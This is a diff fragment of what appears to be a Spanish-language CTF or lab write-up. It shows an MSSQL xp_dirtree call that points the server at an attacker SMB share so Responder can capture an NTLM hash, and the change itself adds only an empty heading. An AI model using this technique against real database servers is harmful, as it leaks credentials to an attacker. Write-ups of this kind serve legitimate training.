@@ -144,3 +144,6 @@ vamos a iniciar el responder para intentar obtener un hash. si intentamos listar
 EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1
 ```
 ![[Pasted image 20240328222914.png]]
+
+###
+
